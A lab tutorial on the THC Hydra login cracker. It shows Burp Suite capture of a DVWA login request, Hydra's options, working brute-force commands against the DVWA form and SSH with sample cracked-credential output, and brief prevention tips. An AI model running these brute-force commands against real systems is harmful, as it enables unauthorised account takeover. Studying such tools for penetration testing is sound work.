Hydra | THC Hydra
#BASICS

Hydra (or THC Hydra) is a parallelized network login cracker built into various operating systems like Kali Linux, Parrot 
and other major penetration testing environments. It was created as a proof of concept tool, for security researchers to 
demonstrate how easy it can be to crack logins. Hydra works by using different approaches, such as brute-force attacks 
and dictionary attacks, in order to guess the right username and password combination. Hydra is commonly used by penetration 
testers together with a set of programmes like crunch, cupp etc, which are used to generate wordlists based on user-defined 
patterns.

-> Prepare systems
  Start Burp Suite and put Intercept at On (folder Proxy). 
  Use DVWA (<metasploitable IP> then choose DVWA. Type "admin" and a random password, ie "pass".
  In Burp, go to the Request part (bottom), choose folder Pretty then copy the data:
    username=admin&password=pass&Login=Login
  In Burp, stop Interception.
   
-> Use hydra
* Help me
  $ hydra -h    |    man hydra

  -l <login>         : give a unique login.
  -L <login file>    : give a file containing a list of users.
  -p <password>      : give a unique password.
  -P <password file> :
  -I                 : ignore last session (don't wait for 10 s).
  -e n|s|r           : specify rule for admin/password. With n: null password.
                                                             s: password same as login.
                                                             r: password is reverse login (ie toor for root).
  -x                 : gives a patern (see examples below).
  -d                 : debug mode.
  -V                 : verbose mode.
  -R                 : restore a previous session stopped by "Ctrl-C".

* Use it (this is an example)
$ hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt 
        -V -I <ms IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

>>> the result:
...
[ATTEMPT] target ms - login "manager" - pass "manager" - 22 of 266 [child 10] (0/0)
[ATTEMPT] target ms - login "manager" - pass "letmein" - 23 of 266 [child 0] (0/0)
[80][http-post-form] host: ms   login: admin   password: password
[ATTEMPT] target ms - login "manager" - pass "cisco" - 24 of 266 [child 2] (0/0)
[ATTEMPT] target ms - login "manager" - pass "default" - 25 of 266 [child 6] (0/0)
...
1 of 1 target successfully completed, 1 valid password found

-> A simple and common example
$ hydra -l <user> -P <password.file> ssh://192.168.8.1:22

-> Some examples with patern
$ hydra -x 3:5:a      : from 3 to 5 characters in lowercase.
$ hydra -x 5:8:A1     : from 5 to 8 characters with uppercase and numbers.
$ hydra -x 3:5:aA1 -y : from 3 to 5 characters with only 'a', 'A' and '1'.

-> Prevent Hydra
  -Don't use easy passwords.
  -Limit the number of access to a login. Block next attemps for an amount of time.
